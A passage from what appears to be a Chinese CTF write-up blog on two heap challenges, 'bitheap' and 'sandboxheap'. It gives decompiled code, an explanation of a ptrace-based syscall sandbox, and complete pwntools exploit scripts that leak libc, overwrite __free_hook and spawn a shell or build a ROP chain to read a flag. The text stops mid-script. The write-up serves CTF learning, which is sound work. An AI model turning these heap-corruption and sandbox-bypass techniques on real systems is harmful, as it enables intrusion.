&lt;&lt; (i &amp; <span class="number">7</span>);		<span class="comment">// 置当前最高bit为1，其余为0</span></span><br><span class="line"></span><br><span class="line">        v6 = (_BYTE *)(ptr + ((<span class="type">int</span>)i &gt;&gt; <span class="number">3</span>));	<span class="comment">// 以一个字节作为一个读取单位</span></span><br><span class="line">        v7 = *v6 &amp; ~(<span class="number">1</span> &lt;&lt; (i &amp; <span class="number">7</span>));		<span class="comment">// 除去当前最高位后剩余的bit</span></span><br><span class="line">        <span class="keyword">if</span> ( v9[i] == <span class="string">&#x27;1&#x27;</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        ++i;</span><br><span class="line">        *v6 = v7;		<span class="comment">// 当前最高位设置为0</span></span><br><span class="line">        <span class="keyword">if</span> ( size == i )</span><br><span class="line">          <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v10;</span><br><span class="line">      &#125;</span><br><span class="line">      *v6 = v5 + v7;		<span class="comment">// v5就是当前最高位设置为1</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./bitheap&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./bitheap&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh, <span class="string">&#x27;x/10gx $rebase(0x2020E0)&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))    <span class="comment"># size &lt;= 0x200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0xf8</span>)    <span class="comment"># victim1</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0xf8</span>)    <span class="comment"># victim2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(i + <span class="number">5</span>, <span class="number">0xf8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    delete(i + <span class="number">5</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;0&#x27;</span> * <span class="number">0x10</span> * <span class="number">8</span></span><br><span class="line">pld += <span class="built_in">bytes</span>(<span class="built_in">bin</span>(<span class="number">0x240</span>)[::-<span class="number">1</span>][:-<span class="number">2</span>].ljust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>), encoding = <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">pld += <span class="string">b&#x27;0&#x27;</span></span><br><span class="line">edit(<span class="number">3</span>, pld)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0xa8</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x48</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = uu64() - <span class="number">0x3ebca0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x18</span>)</span><br><span class="line">pld = <span class="built_in">bytes</span>(<span class="built_in">bin</span>(free_hook - <span class="number">8</span>)[::-<span class="number">1</span>][:-<span class="number">2</span>].ljust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>), encoding = <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">edit(<span class="number">5</span>, pld)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0xf8</span>)</span><br><span class="line">pld = <span class="string">b&#x27;0&#x27;</span> * <span class="number">64</span></span><br><span class="line">pld += <span class="built_in">bytes</span>(<span class="built_in">bin</span>(system)[::-<span class="number">1</span>][:-<span class="number">2</span>].ljust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>), encoding = <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">edit(<span class="number">7</span>, pld)</span><br><span class="line"></span><br><span class="line">bin_sh = <span class="string">&#x27;0x&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;/bin/sh&#x27;</span>[::-<span class="number">1</span>]:</span><br><span class="line">    bin_sh += <span class="built_in">hex</span>(<span class="built_in">ord</span>(j))[<span class="number">2</span>:]</span><br><span class="line">bin_sh = <span class="built_in">int</span>(bin_sh, <span class="number">16</span>)</span><br><span class="line">pld = <span class="built_in">bytes</span>(<span class="built_in">bin</span>(bin_sh)[::-<span class="number">1</span>][:-<span class="number">2</span>].ljust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>), encoding = <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">edit(<span class="number">4</span>, pld)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="sandboxheap"><a href="#sandboxheap" class="headerlink" title="sandboxheap"></a>sandboxheap</h2><p>和<code>bitheap</code>这一题差不多，同样的漏洞，同样的libc版本，也是二进制输入，只不过是加了沙箱。这里重点介绍这个沙箱。</p>
<blockquote>
<p>参考文章：</p>
<p><a href="https://www.cnblogs.com/tangr206/articles/3094358.html">Ptrace 详解 - tangr206 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.cnblogs.com/heixiang/p/10988992.html">ptrace函数深入分析 - 黑箱 - 博客园 (cnblogs.com)</a></p>
</blockquote>
<p>这个沙箱和我们平常见到的不太一样，利用的是<code>ptrace</code>这个系统调用，什么是ptrace？简单来说就是提供父进程跟踪子进程的能力，发送给子进程的部分信号会转发给父进程，父进程可以对中止的子进程进行检查和修改，当这些操作都完成后，可以继续子进程的运行。我们常用的gdb和strace都是依托了这个强大的系统调用。</p>
<p>ptrace函数的原型及各个参数的含义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="type">long</span> <span class="title function_">ptrace</span><span class="params">(<span class="keyword">enum</span> __ptrace_request request, <span class="type">pid_t</span> pid, <span class="type">void</span> *addr, <span class="type">void</span> *data)</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">ptrace_request</span> <span class="title">request</span>		// <span class="title">ptrace</span>要执行的命令</span></span><br><span class="line"><span class="class"><span class="title">pid_t</span> <span class="title">pid</span>					// 需要跟踪的进程</span></span><br><span class="line"><span class="class"><span class="title">void</span> *<span class="title">addr</span>					// 需要监控的内存地址</span></span><br><span class="line"><span class="class"><span class="title">void</span> *<span class="title">data</span>					// 存放读写的数据</span></span><br></pre></td></tr></table></figure>

<p>就以这道题目进行分析：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__pid_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> *v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// rax</span></span><br><span class="line">  _BYTE regs[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-108h] BYREF</span></span><br><span class="line">  <span class="type">int</span> reg_rdi; <span class="comment">// [rsp+70h] [rbp-98h]</span></span><br><span class="line">  __int64 regs_orig_rax; <span class="comment">// [rsp+78h] [rbp-90h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v11; <span class="comment">// [rsp+D8h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __fprintf_chk(<span class="built_in">stderr</span>, <span class="number">1LL</span>, <span class="string">&quot;strace: too few arguments: %d&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = fork();</span><br><span class="line">    v4 = v3;</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 )                                 <span class="comment">// 父进程</span></span><br><span class="line">      &#123;</span><br><span class="line">        waitpid(v3, <span class="number">0LL</span>, <span class="number">0</span>);</span><br><span class="line">        ptrace(PTRACE_SETOPTIONS, v4, <span class="number">0LL</span>, <span class="number">0x100000</span>LL);</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( ptrace(PTRACE_SYSCALL, v4, <span class="number">0LL</span>, <span class="number">0LL</span>) == <span class="number">-1</span><span class="comment">// 使子进程继续运行，直到其产生系统调用时中止</span></span><br><span class="line">            || waitpid(v4, <span class="number">0LL</span>, <span class="number">0</span>) == <span class="number">-1</span></span><br><span class="line">            || ptrace(PTRACE_GETREGS, v4, <span class="number">0LL</span>, regs) == <span class="number">-1</span> )<span class="comment">// 读取寄存器的值到reg中</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( regs_orig_rax == <span class="number">37</span> )            <span class="comment">// alarm</span></span><br><span class="line">            set_map(<span class="number">1</span>);</span><br><span class="line">          v5 = regs_orig_rax;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)regs_orig_rax &lt;= <span class="number">0x2710</span> &amp;&amp; sys_map[(<span class="type">int</span>)regs_orig_rax] )</span><br><span class="line">          &#123;</span><br><span class="line">            regs_orig_rax = <span class="number">-1LL</span>;</span><br><span class="line">            <span class="keyword">if</span> ( ptrace(PTRACE_SETREGS, v4, <span class="number">0LL</span>, regs) == <span class="number">-1</span> )<span class="comment">// 从reg中恢复寄存器的值</span></span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            v5 = regs_orig_rax;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">switch</span> ( v5 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0xE7</span>LL:</span><br><span class="line">              <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0x2710</span>LL:</span><br><span class="line">              set_map(reg_rdi);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0x3C</span>LL:</span><br><span class="line">LABEL_24:</span><br><span class="line">              <span class="built_in">exit</span>(reg_rdi);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( ptrace(PTRACE_SYSCALL, v4, <span class="number">0LL</span>, <span class="number">0LL</span>) != <span class="number">-1</span></span><br><span class="line">             &amp;&amp; waitpid(v4, <span class="number">0LL</span>, <span class="number">0</span>) != <span class="number">-1</span></span><br><span class="line">             &amp;&amp; (regs_orig_rax != <span class="number">10000</span> &amp;&amp; regs_orig_rax != <span class="number">-1</span> || ptrace(PTRACE_POKEUSER, v4, <span class="number">80LL</span>) != <span class="number">-1</span>) );</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                      <span class="comment">// 子进程</span></span><br><span class="line">      &#123;</span><br><span class="line">        ptrace(PTRACE_TRACEME, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);  <span class="comment">// 希望被父进程跟踪</span></span><br><span class="line">        execvp(a2[<span class="number">1</span>], a2 + <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v6 = __errno_location();</span><br><span class="line">    v7 = strerror(*v6);</span><br><span class="line">    __fprintf_chk(<span class="built_in">stderr</span>, <span class="number">1LL</span>, <span class="string">&quot;strace: %s&quot;</span>, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  fputc(<span class="number">10</span>, <span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重点是在<code>set_map</code>函数中：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">set_map</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(sys_map, <span class="number">1</span>, <span class="number">0x2711</span>uLL);			   <span class="comment">// 初始化 sys_map 数组</span></span><br><span class="line">  sys_map[<span class="number">3</span>] = <span class="number">0</span>;                               <span class="comment">// sys_close</span></span><br><span class="line">  *(_DWORD *)&amp;sys_map[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">  sys_map[<span class="number">60</span>] = <span class="number">0</span>;                              <span class="comment">// sys_exit</span></span><br><span class="line">  sys_map[<span class="number">231</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (a1 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sys_map[<span class="number">40</span>] = <span class="number">0</span>;                            <span class="comment">// sys_sendfile</span></span><br><span class="line">    *(_WORD *)sys_map = <span class="number">0</span>;                      <span class="comment">// sys_read, sys_write</span></span><br><span class="line">    *(_DWORD *)&amp;sys_map[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">    *(_WORD *)&amp;sys_map[<span class="number">295</span>] = <span class="number">0</span>;</span><br><span class="line">    byte_204750 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (a1 &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">    sys_map[<span class="number">2</span>] = <span class="number">0</span>;                             <span class="comment">// sys_open</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，如果我们输入的系统调用号在<code>sys_map</code>数组中的值为1，那么将不会报错，否则就会退出。其次，我们发现在<code>set_map</code>函数中有初始化<code>sys_map</code>数组的操作。如何初始化这个数组？首先，我们需要控制rax为0x2710才能进入我们需要的<code>set_map</code>函数，再通过控制<code>rdi</code>为3，使得<code>read()</code>、<code>write()</code>和<code>open()</code>的系统调用号在<code>sys_map</code>数组中的偏移为1，这样我们就可以orw了。</p>
<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">3</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./sandboxheap&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./sandboxheap&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./sandboxheap&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh, <span class="string">&#x27;x/10gx $rebase(0x2020E0)&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)    </span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_bin</span>(<span class="params">ipt</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(<span class="built_in">bin</span>(ipt)[::-<span class="number">1</span>][:-<span class="number">2</span>].ljust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>), encoding = <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0xf8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i + <span class="number">1</span>, <span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>, <span class="string">b&#x27;0&#x27;</span> * <span class="number">0xf0</span> * <span class="number">8</span> + to_bin(<span class="number">0x800</span>) + <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">7</span> - i)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x110</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;1&#x27;</span> * <span class="number">0xff</span> * <span class="number">8</span> + <span class="string">b&#x27;10001000&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;\xff\x11&#x27;</span>)</span><br><span class="line">heap_base = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x460</span></span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;0&#x27;</span> * <span class="number">0xf8</span> * <span class="number">8</span> + to_bin(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x110</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = uu64() - <span class="number">0x3ebca0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">setcontext_53 = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br><span class="line">op = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">pt = libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">rd = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">p_rdi_r = libc_base + <span class="number">0x000000000002164f</span></span><br><span class="line">p_rsi_r = libc_base + <span class="number">0x0000000000023a6a</span></span><br><span class="line">p_rdx_r = libc_base + <span class="number">0x0000000000001b96</span></span><br><span class="line">p_rax_r = libc_base + <span class="number">0x000000000001b500</span></span><br><span class="line">syscall_ret = libc_base + <span class="number">0x00000000000d2625</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;0&#x27;</span> * <span class="number">0xd8</span> * <span class="number">8</span> + to_bin(<span class="number">0x101</span>) + to_bin(free_hook - <span class="number">8</span>))</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0xf8</span>)</span><br><span class="line">edit(<span class="number">4</span>, <span class="string">b&#x27;0&#x27;</span> * <span class="number">64</span> + to_bin(setcontext_53))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x200</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line">orw = to_bin(p_rax_r) + to_bin(<span class="number">0x2710</span>)</span><br><span class="line">orw += to_bin(p_rdi_r) + to_bin(<span class="number">3</span>)</span><br><span class="line">orw += to_bin(syscall_ret)</span><br><span class="line">orw += to_bin(p_rdi_r) + to_bin(heap_base + <span class="number">0x4a0</span> + <span class="number">0xb0</span>)</span><br><span class="line">orw += to_bin(p_rsi_r) + to_bin(<span class="number">0</span>)</span><br><span class="line">orw += to_bin(p_rdx_r) + to_bin(<span class="number">0</span>)</span><br><span class="line">orw += to_bin(op)</span><br><span class="line">orw += to_bin(p_rdi_r) + to_bin(<span class="number">3</span>)</span><br><span class="line">orw += to_bin(p_rsi_r) + to_bin(heap_base + <span class="number">0x100</span>)</span><br><span class="line">orw += to_bin(p_rdx_r) + to_bin(<span class="number">0x20</span>)</span><br><span class="line">orw += to_bin(rd)</span><br><span class="line">orw += to_bin(p_rdi_r) + to_bin(heap_base + <span class="number">0x100</span>)</span><br><span class="line">orw += to_bin(pt)</span><br><span class="line">orw += to_bin(<span class="number">0x67616c66</span>)</span><br><span class="line">edit(<span class="number">5</span>, 